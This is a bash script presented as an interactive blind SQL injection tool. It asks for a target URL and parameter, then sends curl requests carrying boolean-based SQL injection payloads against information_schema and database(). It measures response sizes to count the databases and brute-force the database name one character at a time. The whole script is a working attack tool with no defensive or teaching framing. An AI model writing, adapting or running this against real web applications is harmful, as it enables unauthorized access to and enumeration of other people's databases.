#!/bin/bash

echo "Welcome to the Blind SQL Injection Tool"
echo "---------------------------------------"
echo "1. Find the number of databases"
echo "2. Brute force the database names"
echo "3. Find the number and brute force the database names"
echo "Select an option: "
read -r ACTION

echo "Select HTTP method:"
echo "1. GET"
echo "2. POST"
read -r METHOD_CHOICE

METHOD="GET"
[[ "$METHOD_CHOICE" -eq 2 ]] && METHOD="POST"

echo "Enter the target URL: "
read -r URL

echo "Enter the parameter to test (e.g., id): "
read -r PARAMETER

send_request() {
    local query="$1"
    local injection="${PARAMETER}=${query}"
    if [ "$METHOD" == "POST" ]; then
        curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
    else
        curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
    fi
}

extract_length() {
	local test_length
    local length
    local response_lengths=()
    local significant_difference=10

    for length in {1..20}; do
        echo -n "Making request with count $length..."
        test_length=$(send_request "1' or (select count(schema_name) from information_schema.schemata)=$length-- -")
        response_lengths[length]=$test_length
        echo " Length: ${response_lengths[length]}"
    done

    for length in {1..20}; do
        local differences=0
        for compare_length in {1..20}; do
            if [ "${response_lengths[length]}" -ne "${response_lengths[compare_length]}" ]; then
                differences=$((differences + 1))
            fi
        done

        if [ "$differences" -ge "$significant_difference" ]; then
            echo "The correct count of databases is likely: $length (response length: ${response_lengths[length]})"
            return
        fi
    done

    echo "Failed to determine the correct count of databases."
}

brute_force_db_names() {
	local db_name=""
    local position=1
    local reference_length=$(send_request "1' and '1'='2" -- -)
    local current_length
    local found_char=false

    echo "Brute forcing the database name..."

    while : ; do
        found_char=false
        for ascii in {97..122}; do  # Adjust the range for the characters you expect
            local char=$(printf \\$(printf '%03o' $ascii))
            local query="1' or substring(database(),$position,1)='$char' -- -"
            current_length=$(send_request "$query")

            #echo "Testing character '$char' at position $position: Response Length - $current_length"

            if [[ "$current_length" -ne "$reference_length" ]]; then
                db_name+="$char"
                echo "Found character '$char' at position $position with length $current_length"
                found_char=true
                # Update reference length if required here
                break
            fi
        done

        if ! $found_char; then
            echo "No more characters found. Database name likely complete."
            break
        fi
        ((position++))
    done

    echo "Database name: $db_name"
}

brute_force_all() {
	
            local number_of_databases=$(extract_length)
            echo "Number of databases: $number_of_databases"
           
 	    sleep 2

            brute_force_db_names $(extract_length)
            

}

list_items() {
    case "$ACTION" in
        1)
            local number_of_databases=$(extract_length)
            echo "Number of databases: $number_of_databases"
            ;;
        2)
            brute_force_db_names $(extract_length)
            ;;
        3)
            brute_force_all
            ;;
        *)
            echo "Invalid option."
            exit 1
            ;;
    esac
}

list_items

